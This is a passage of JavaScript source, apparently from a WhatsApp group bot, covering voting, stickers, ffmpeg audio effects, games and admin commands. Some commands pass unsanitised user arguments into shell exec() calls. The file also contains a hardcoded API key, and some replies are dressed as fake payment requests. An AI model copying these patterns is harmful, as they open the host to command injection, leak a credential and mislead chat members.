 isVote = vote[m.chat][1].concat(vote[m.chat][2])
 wasVote = isVote.includes(m.sender)
 if (wasVote) return replygcxeon('You have Voted')
 vote[m.chat][2].push(m.sender)
 menvote = vote[m.chat][1].concat(vote[m.chat][2])
 teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* - to downvote
*${prefix}deletevote* - to delete vote`
 Yasam.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
 break
 
case 'checkvote':
if (!m.isGroup) return replygcxeon (mess.group)
if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${Yasam.user.id}
`
Yasam.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case'delvote': case 'hapusvote': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!(m.chat in vote)) return replygcxeon(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
 delete vote[m.chat]
 replygcxeon('Successfully Deleted Vote Session In This Group')
	 }
 break
break
 case 'revoke':
 case 'resetlink':
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isAdmins && !isGroupOwner && !YasamCreator) return replygcxeon(mess.botAdmin)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 await Yasam.groupRevokeInvite(m.chat)
 .then(res => {
 replygcxeon(`Reset Success`)
 })
 break
 //bot status
 case 'ping': case 'botstatus': case 'statusbot': case 'p': {
	const used = process.memoryUsage()
 const cpus = os.cpus().map(cpu => {
 cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
			 return cpu
 })
 const cpu = cpus.reduce((last, cpu, _, { length }) => {
 last.total += cpu.total
 last.speed += cpu.speed / length
 last.times.user += cpu.times.user
 last.times.nice += cpu.times.nice
 last.times.sys += cpu.times.sys
 last.times.idle += cpu.times.idle
 last.times.irq += cpu.times.irq
 return last
 }, {
 speed: 0,
 total: 0,
 times: {
			 user: 0,
			 nice: 0,
			 sys: 0,
			 idle: 0,
			 irq: 0
 }
 })
 let timestamp = speed()
 let latensi = speed() - timestamp
 neww = performance.now()
 oldd = performance.now()
 respon = `
Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}

💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}

_NodeJS Memory Usaage_
${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}

${cpus[0] ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
 `.trim()
	Yasam.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'INR',
 amount1000: 999999999,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: respon,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
 }
	
	break
	case 'repo': case 'repository': {
 try {
 const [, username, repoName] = botscript.match(/github\.com\/([^/]+)\/([^/]+)/)
 const response = await axios.get(`https://api.github.com/repos/${username}/${repoName}`)
 if (response.status === 200) {
 const repoData = response.data
 const formattedInfo = `
${themeemoji} Repository Name: ${repoData.name}
${themeemoji} Description: ${repoData.description}
${themeemoji} Owner: ${repoData.owner.login}
${themeemoji} Stars: ${repoData.stargazers_count}
${themeemoji} Forks: ${repoData.forks_count}
${themeemoji} URL: ${repoData.html_url}
 
 `.trim()
 await Yasam.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'INR',
 amount1000: 69000,
 requestFrom: m.sender,
 noteMessage: {
 extendedTextMessage: {
 text: formattedInfo,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})
 } else {
 await replygcxeon(`Unable to fetch repository information`)
 }
 } catch (error) {
 console.error(error)
 await replygcxeon(`Repository currently not available `)
 }
}
break

case 'owner': {
 Yasam.sendMessage(from, {
 contacts: {
 displayName: `${list.length} Contact`,
 contacts: list
 }, contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
 thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
 sourceUrl: wagc,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: fvrif
 }) 

 }
 break

case 'rentbot':
 replygcxeon(`Type ${prefix}owner and chat him`)
 break
 case 'speedtest': {
 replygcxeon('Testing Speed...')
 let cp = require('child_process')
 let {
 promisify
 } = require('util')
 let exec = promisify(cp.exec).bind(cp)
 let o
 try {
 o = await exec('python speed.py')
 } catch (e) {
 o = e
 } finally {
 let {
 stdout,
 stderr
 } = o
 if (stdout.trim()) Yasam.sendMessage(m.chat, {
 text: stdout,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
 thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
 sourceUrl: wagc,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: fvrif
 })
 if (stderr.trim()) Yasam.sendMessage(m.chat, {
 text: stderr,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
 thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
 sourceUrl: wagc,
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: fvrif
 })
 }
 }
 break
 case 'runtime':
 let pinga = `Bots Have Been Running For ${runtime(process.uptime())}`
 Yasam.sendMessage(m.chat, {
 text: pinga,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true,
 title: botname,
 body: ownername,
 thumbnailUrl: 'https://files.catbox.moe/9fok4g.jpg',
 sourceUrl: "",
 mediaType: 1,
 renderLargerThumbnail: true
 }
 }
 }, {
 quoted: fvrif
 })
 break

case 's': case 'sticker': case 'stiker': {
if (!quoted) return replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
if (/image/.test(mime)) {
let media = await quoted.download()
let encmedia = await Yasam.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds')
let media = await quoted.download()
let encmedia = await Yasam.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
} else {
replygcxeon(`Send/Reply Images/Videos/Gifs With Captions ${prefix+command}\nVideo Duration 1-9 Seconds`)
}
}
break
			case 'swm': case 'steal': case 'stickerwm': case 'take':{
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!q) return replygcxeon(`Where is the text?`)
				await emote('⏱️');
				const pcknm = q.split("|")[0]
				const atnm = q.split("|")[1]
				if (m.quoted.isAnimated === true) {
					Yasam.downloadAndSaveMediaMessage(quoted, "gifee")
					Yasam.sendMessage(m.chat, {sticker:fs.readFileSync("gifee.webp")}, m, { packname: pcknm, author: atnm })
				} else if (/image/.test(mime)) {
					let media = await Yasam.downloadAndSaveMediaMessage(quoted)
					let encmedia = await Yasam.sendImageAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
				} else if (/video/.test(mime)) {
					if ((quoted.msg || quoted).seconds > 11) return replygcxeon('Maximum 10 Seconds!')
					let media = await Yasam.downloadAndSaveMediaMessage(quoted)
					let encmedia = await Yasam.sendVideoAsSticker(m.chat, media, m, { packname: pcknm, author: atnm })
				} else {
					replygcxeon(`Photo/Video?`)
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
 case 'toimage':
 case 'toimg': {
 if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadAndSaveMediaMessage(qmsg)
 let ran = await getRandom('.png')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) return err
 let buffer = fs.readFileSync(ran)
 Yasam.sendMessage(m.chat, {
 image: buffer
 }, {
 quoted: fvrif
 })
 fs.unlinkSync(ran)
 })

 }
 break
 case 'tomp4':
 case 'tovideo': {
 if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadAndSaveMediaMessage(qmsg)
 let webpToMp4 = await webp2mp4File(media)
 await Yasam.sendMessage(m.chat, {
 video: {
 url: webpToMp4.result,
 caption: 'Convert Webp To Video'
 }
 }, {
 quoted: fvrif
 })
 await fs.unlinkSync(media)

 }
 break
 case 'toaud':
 case 'toaudio': {
 if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into audio with captions ${prefix + command}`)
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadMediaMessage(qmsg)
 let audio = await toAudio(media, 'mp4')
 Yasam.sendMessage(m.chat, {
 audio: audio,
 mimetype: 'audio/mpeg'
 }, {
 quoted: fvrif
 })

 }
 break
 case 'tomp3': {
 if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into MP3 with captions ${prefix + command}`)
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadMediaMessage(qmsg)
 let audio = await toAudio(media, 'mp4')
 Yasam.sendMessage(m.chat, {
 document: audio,
 mimetype: 'audio/mp3',
 fileName: `dgxeon.mp3`
 }, {
 quoted: fvrif
 })

 }
 break
 case 'tovn':
 case 'toptt': {
 if (!/video/.test(mime) && !/audio/.test(mime)) return replygcxeon(`Send/Reply Video/Audio that you want to make into a VN with captions ${prefix + command}`)
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadMediaMessage(qmsg)
 let {
 toPTT
 } = require('./lib/converter')
 let audio = await toPTT(media, 'mp4')
 Yasam.sendMessage(m.chat, {
 audio: audio,
 mimetype: 'audio/mpeg',
 ptt: true
 }, {
 quoted: fvrif
 })

 }
 break
 case 'togif': {
 if (!/webp/.test(mime)) return replygcxeon(`Reply sticker with caption *${prefix + command}*`)
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadAndSaveMediaMessage(qmsg)
 let webpToMp4 = await webp2mp4File(media)
 await Yasam.sendMessage(m.chat, {
 video: {
 url: webpToMp4.result,
 caption: 'Convert Webp To Video'
 },
 gifPlayback: true
 }, {
 quoted: fvrif
 })
 await fs.unlinkSync(media)

 }
 break
 case 'emojimix': {
 let [emoji1, emoji2] = text.split`+`
 if (!emoji1) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
 if (!emoji2) return replygcxeon(`Example : ${prefix + command} 😅+🤔`)
 await replygcxeon (mess.wait)
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
 for (let res of anu.results) {
 let encmedia = await Yasam.sendImageAsSticker(m.chat, res.url, m, {
 packname: global.packname,
 author: global.author,
 categories: res.tags
 })
 }
 }
 break
 case 'emojimix2': {
 if (!text) return replygcxeon(`Example : ${prefix + command} 😅`)
 let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(text)}`)
 for (let res of anu.results) {
 let encmedia = await Yasam.sendImageAsSticker(m.chat, res.url, m, {
 packname: global.packname,
 author: global.author,
 categories: res.tags
 })
 }
 }
 break
 case 'toonce':
 case 'toviewonce': {
 if (!quoted) return replygcxeon(`Reply Image/Video`)
 if (/image/.test(mime)) {
 anuan = await Yasam.downloadAndSaveMediaMessage(quoted)
 Yasam.sendMessage(m.chat, {
 image: {
 url: anuan
 },
 caption: mess.done,
 fileLength: "999",
 viewOnce: true
 }, {
 quoted: fvrif
 })
 } else if (/video/.test(mime)) {
 anuanuan = await Yasam.downloadAndSaveMediaMessage(quoted)
 Yasam.sendMessage(m.chat, {
 video: {
 url: anuanuan
 },
 caption: mess.done,
 fileLength: "99999999",
 viewOnce: true
 }, {
 quoted: fvrif
 })
 } else if (/audio/.test(mime)) {
 bebasap = await Yasam.downloadAndSaveMediaMessage(quoted)
 Yasam.sendMessage(m.chat, {
 audio: {
 url: bebasap
 },
 mimetype: 'audio/mpeg',
 ptt: true,
 viewOnce: true
 })
 }
 }
 break
 case 'fliptext': {
 if (args.length < 1) return replygcxeon(`Example:\n${prefix}fliptext dgxeon`)
 quere = args.join(" ")
 flipe = quere.split('').reverse().join('')
 replygcxeon(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
 }
 break
 case 'toqr':{
 if (!q) return replygcxeon(' Please include link or text!')
 const QrCode = require('qrcode-reader')
 const qrcode = require('qrcode')
 let qyuer = await qrcode.toDataURL(q, { scale: 35 })
 let data = new Buffer.from(qyuer.replace('data:image/png;base64,', ''), 'base64')
 let buff = getRandom('.jpg')
 await fs.writeFileSync('./'+buff, data)
 let medi = fs.readFileSync('./' + buff)
 await Yasam.sendMessage(from, { image: medi, caption:"Here you go!"}, { quoted: fvrif })
 setTimeout(() => { fs.unlinkSync(buff) }, 10000)
 }
 break
 case 'volaudio': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await Yasam.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
Yasam.sendMessage(from, {audio:jadie, mimetype: 'audio/mp4', ptt: true}, {quoted: fvrif})
fs.unlinkSync(rname)
})
}
break
case 'volvideo': {
if (!args.join(" ")) return replygcxeon(`Example: ${prefix + command} 10`)
media = await Yasam.downloadAndSaveMediaMessage(quoted, "volume")
rname = getRandom('.mp4')
exec(`ffmpeg -i ${media} -filter:a volume=${args[0]} ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return replygcxeon('Error!')
jadie = fs.readFileSync(rname)
Yasam.sendMessage(from, {video:jadie, mimetype: 'video/mp4'}, {quoted: fvrif})
fs.unlinkSync(rname)
})
}
break
 case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
 try {
 let set
 if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
 if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
 if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
 if (/earrape/.test(command)) set = '-af volume=12'
 if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
 if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
 if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
 if (/reverse/.test(command)) set = '-filter_complex "areverse"'
 if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
 if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
 if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
 if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
 if (/audio/.test(mime)) {
 await replygcxeon (mess.wait)
 let media = await Yasam.downloadAndSaveMediaMessage(quoted)
 let ran = getRandom('.mp3')
 exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
 fs.unlinkSync(media)
 if (err) return replygcxeon(err)
 let buff = fs.readFileSync(ran)
 Yasam.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
 fs.unlinkSync(ran)
 })
 } else replygcxeon(`Reply to the audio you want to change with a caption *${prefix + command}*`)
 } catch (e) {
 replygcxeon(e)
 }
 break
 //media db
 case 'listbadword':{
let teks = '┌──⭓「 *VN List* 」\n│\n'
for (let x of bad) {
teks += `│⭔ ${x}\n`
}
teks += `│\n└────────────⭓\n\n*Totally there are : ${bad.length}*`
replygcxeon(teks)
}
break

 //game
 case 'ttc':
 case 'ttt':
 case 'tictactoe': {
 let TicTacToe = require("./lib/tictactoe")
 this.game = this.game ? this.game : {}
 if (Object.values(this.game).find(room => room.id.startsWith('tictactoe') && [room.game.playerX, room.game.playerO].includes(m.sender))) return replygcxeon('You are still in the game')
 let room = Object.values(this.game).find(room => room.state === 'WAITING' && (text ? room.name === text : true))
 if (room) {
 replygcxeon('Partner not found!')
 room.o = m.chat
 room.game.playerO = m.sender
 room.state = 'PLAYING'
 let arr = room.game.render().map(v => {
 return {
 X: '❌',
 O: '⭕',
 1: '1️⃣',
 2: '2️⃣',
 3: '3️⃣',
 4: '4️⃣',
 5: '5️⃣',
 6: '6️⃣',
 7: '7️⃣',
 8: '8️⃣',
 9: '9️⃣',
 } [v]
 })
 let str = `Room ID: ${room.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

Turn @${room.game.currentTurn.split('@')[0]}

Type *surrender* to give up and admit defeat`
 if (room.x !== room.o) await Yasam.sendText(room.x, str, m, {
 mentions: parseMention(str)
 })
 await Yasam.sendText(room.o, str, m, {
 mentions: parseMention(str)
 })
 } else {
 room = {
 id: 'tictactoe-' + (+new Date),
 x: m.chat,
 o: '',
 game: new TicTacToe(m.sender, 'o'),
 state: 'WAITING'
 }
 if (text) room.name = text
 replygcxeon('Waiting for partner' + (text ? ` type the command below ${prefix}${command} ${text}` : ''))
 this.game[room.id] = room
 }
 }
 break
 case 'delttc':
 case 'delttt': {
 this.game = this.game ? this.game : {}
 try {
 if (this.game) {
 delete this.game
 Yasam.sendText(m.chat, `Berhasil delete session TicTacToe`, m)
 } else if (!this.game) {
 replygcxeon(`Session TicTacToe🎮 tidak ada`)
 } else replygcxeon('?')
 } catch (e) {
 replygcxeon('rusak')
 }
 }
 break
 case 'suitpvp':
 case 'suit': {
 this.suit = this.suit ? this.suit : {}
 let poin = 10
 let poin_lose = 10
 let timeout = 60000
 if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) replygcxeon(`Finish your previous suit`)
 if (m.mentionedJid[0] === m.sender) return replygcxeon(`Can't play with myself !`)
 if (!m.mentionedJid[0]) return replygcxeon(`_Who do you want to challenge?_\nTag the person..\n\nExample : ${prefix}suit @${owner[1]}`, m.chat, {
 mentions: [owner[1] + '@s.whatsapp.net']
 })
 if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return replygcxeon(`The person you are challenging is playing suit with someone else :(`)
 let id = 'suit_' + new Date() * 1
 let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} challenged @${m.mentionedJid[0].split`@`[0]} to play suits

@${m.mentionedJid[0].split`@`[0]}Please type accept/reject, accept to accept or reject to reject the challenge`
 this.suit[id] = {
 chat: await Yasam.sendText(m.chat, caption, m, {
 mentions: parseMention(caption)
 }),
 id: id,
 p: m.sender,
 p2: m.mentionedJid[0],
 status: 'wait',
 waktu: setTimeout(() => {
 if (this.suit[id]) Yasam.sendText(m.chat, `_Suit time is up_`, m)
 delete this.suit[id]
 }, 60000),
 poin,
 poin_lose,
 timeout
 }
 }
 break

case 'mathquiz': case 'math': {
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) replygcxeon(`There are still unfinished sessions!`)
 let { genMath, modes } = require('./lib/math')
 if (!text) return replygcxeon(`Mode: ${Object.keys(modes).join(' | ')}\nUsage example: ${prefix}math medium`)
 let result = await genMath(text.toLowerCase())
 Yasam.sendText(m.chat, `*What is the result of: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} second`, m).then(() => {
 kuismath[m.sender.split('@')[0]] = result.jawaban
 })
 await sleep(result.waktu)
 if (kuismath.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Answer: " + result.jawaban)
 replygcxeon("Time has run out\nAnswer: " + kuismath[m.sender.split('@')[0]])
 delete kuismath[m.sender.split('@')[0]]
 }
 }
 break
 case 'afk': {
 let user = global.db.data.users[m.sender]
 user.afkTime = + new Date
 user.afkReason = text
 replygcxeon(`${m.pushName} *Telah AFK*${text ? ': ' + text : ''}`)
}
 break
 			case 'presetam': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) return replygcxeon(`⚠️ Eits, kakak lupa kasih URL! 😗 Coba ketik kayak gini ya: *${prefix + command} [URL Alight Motion]*`);
				if (!(text.includes('http://') || text.includes('https://'))) {
					return replygcxeon(`⚠️ URL tidak valid. Coba pakai URL yang diawali dengan http:// atau https://`);
				}
				if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) {
					return replygcxeon(`⚠️ URL yang diberikan bukan URL Alight Motion!`);
				}
				try {
					const result = await alightScrape(text);
					if (result.error) {
						return replygcxeon(result.error);
					}
					const { title, description } = result;
					await replygcxeon(`[ *PRESET ALIGHT MOTION* ]\n\nJudul: ${title}\nDeskripsi: ${description}`);
				} catch (error) {
					console.error(error);
					replygcxeon('⚠️ Terjadi kesalahan saat mengambil data dari URL!');
				}
			}
			db.data.users[m.sender].limit -= 1;
			break;
 case 'openai-indo': {
	 if (!q) return replygcxeon(`Example : ${prefix + command} who is ronaldo`)
			 var isiai = await fetchJson(`https://aemt.me/openai?text=${q}`)
			 var isi = isiai.result
		 await replygcxeon(isi)
			 }
			 break
 case 'xxqc': {
if (!q) return replygcxeon(`📌Example: ${prefix + command} pink hallo\n\n꒰ 🖌️ Color List ꒱ ೄྀ࿐ ˊˎ-\n━━━━━━⊱⋆⊰━━━━━━\npink\nblue\nred\ngreen\nyellow\npurple\ndarkblue\nlightblue\nash\norange\nblack\nwhite\nteal\nlightpink\nchocolate\nsalmon\nmagenta\ntan\nwheat\ndeeppink\nfire\nskyblue\nsafron\nbrightskyblue\nhotpink\nlightskyblue\nseagreen\ndarkred\norangered\ncyan\nviolet\nmossgreen\ndarkgreen\nnavyblue\ndarkorange\ndarkpurple\nfuchsia\ndarkmagenta\ndarkgray\npeachpuff\nblackishgreen\ndarkishred\ngoldenrod\ndarkishgray\ndarkishpurple\ngold\nsilver`)
if (text.length > 100) return replygcxeon(`Max 100 character.`)
let [color, ...message] = text.split(' ');
message = message.join(' ');
let backgroundColor;
switch(color) {
case 'pink':
backgroundColor = '#f68ac9';
break;
case 'blue':
backgroundColor = '#6cace4';
break;
case 'red':
backgroundColor = '#f44336';
break;
case 'green':
backgroundColor = '#4caf50';
break;
case 'yellow':
backgroundColor = '#ffeb3b';
break;
case 'purple':
backgroundColor = '#9c27b0';
break;
case 'darkblue':
backgroundColor = '#0d47a1';
break;
case 'lightblue':
backgroundColor = '#03a9f4'; 
break;
case 'ash':
backgroundColor = '#9e9e9e';
break;
case 'orange':
backgroundColor = '#ff9800';
break;
case 'black':
backgroundColor = '#000000';
break;
case 'white':
backgroundColor = '#ffffff';
break;
case 'teal':
backgroundColor = '#008080';
break;
case 'lightpink':
backgroundColor = '#FFC0CB';
break;
case 'chocolate':
backgroundColor = '#A52A2A';
case 'salmon':
backgroundColor = '#FFA07A'; 
break; 
case 'magenta':
backgroundColor = '#FF00FF'; 
break; 
case 'tan':
backgroundColor = '#D2B48C'; 
break;
case 'wheat':
backgroundColor = '#F5DEB3'; 
break;
case 'deeppink':
backgroundColor = '#FF1493'; 
break; 
case 'fire':
backgroundColor = '#B22222';
break;
case 'skyblue':
backgroundColor = '#00BFFF';
break; 
case 'orange':
backgroundColor = '#FF7F50';
break;
case 'brightskyblue':
backgroundColor = '#1E90FF'; 
break; 
case 'hotpink':
backgroundColor = '#FF69B4'; 
break; 
case 'lightskyblue':
backgroundColor = '#87CEEB'; 
break; 
case 'seagreen':
backgroundColor = '#20B2AA'; 
break; 
case 'darkred':
backgroundColor = '#8B0000'; 
break; 
case 'orangered':
backgroundColor = '#FF4500'; 
break; 
case 'cyan':
backgroundColor = '#48D1CC'; 
break; 
case 'violet':
backgroundColor = '#BA55D3'; 
break; 
case 'mossgreen':
backgroundColor = '#00FF7F'; 
break; 
case 'darkgreen':
backgroundColor = '#008000'; 
break; 
case 'navyblue':
backgroundColor = '#191970'; 
break; 
case 'darkorange':
backgroundColor = '#FF8C00'; 
break; 
case 'darkpurple':
backgroundColor = '#9400D3'; 
break; 
case 'fuchsia':
backgroundColor = '#FF00FF'; 
break; 
case 'darkmagenta':
backgroundColor = '#8B008B'; 
break;
case 'darkgray':
backgroundColor = '#2F4F4F'; 
break;
case 'peachpuff':
backgroundColor = '#FFDAB9'; 
break;
case 'darkishgreen':
backgroundColor = '#BDB76B'; 
break;
case 'darkishred':
backgroundColor = '#DC143C'; 
break;
case 'goldenrod':
backgroundColor = '#DAA520'; 
break;
case 'darkishgray':
backgroundColor = '#696969'; 
break;
case 'darkishpurple':
backgroundColor = '#483D8B'; 
break;
case 'gold':
backgroundColor = '#FFD700'; 
break;
case 'silver':
backgroundColor = '#C0C0C0'; 
break;
default:
return replygcxeon('The selected color is not available.')
}
let obj = {
type: 'quote',
format: 'png',
backgroundColor,
width: 512,
height: 768,
scale: 2,
messages: [
{
entities: [],
avatar: true,
from: {
id: 1,
name: pushname,
photo: { 
url: await Yasam.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
}
},
text: message,
replyMessage: {},
},
],
};
let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
headers: {
'Content-Type': 'application/json',
},
});
let buffer = Buffer.from(response.data.result.image, 'base64');
Yasam.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}`})
}
break

case 'ephemeral': {
 if (!m.isGroup) return replygcxeon (mess.group)
 if (!isBotAdmins) return replygcxeon(mess.botAdmin)
 if (!isAdmins) return replygcxeon(mess.botAdmin)
 if (!text) return replygcxeon('Enter the value on/off')
 if (args[0] === 'on') {
 await Yasam.sendMessage(m.chat, { disappearingMessagesInChat: WA_DEFAULT_EPHEMERAL })
 await replygcxeon(`Done`)
 } else if (args[0] === 'off') {
 await Yasam.sendMessage(m.chat, { disappearingMessagesInChat: false })
 await replygcxeon(`Done`)
 }
 }
 break
 case 'delete': case 'del': case 'd':{
 	 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
 Yasam.sendMessage(m.chat, { delete: key })
}
break
 case 'autoswview':
 case 'autostatusview':{
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 antiswview = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 antiswview = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 case 'anticall': {
 if (!YasamCreator) return replygcxeon (mess.owner)
 if (args.length < 1) return replygcxeon('on/off?')
 if (args[0] === 'on') {
 anticall = true
 replygcxeon(`${command} is enabled`)
 } else if (args[0] === 'off') {
 anticall = false
 replygcxeon(`${command} is disabled`)
 }
 }
 break
 break
case 'addvideo':{
if (!YasamCreator) return replygcxeon (mess.owner)
if (args.length < 1) return replygcxeon('Whats the video name?')
if (VideoXeon.includes(q)) return replygcxeon("The name is already in use")
let delb = await Yasam.downloadAndSaveMediaMessage(quoted)
VideoXeon.push(q)
await fsx.copy(delb, `./XeonMedia/video/${q}.mp4`)
fs.writeFileSync('./XeonMedia/database/xeonvideo.json', JSON.stringify(VideoXeon))
fs.unlinkSync(delb)
replygcxeon(`Success Adding Video\nCheck by typing ${prefix}listvideo`)
}
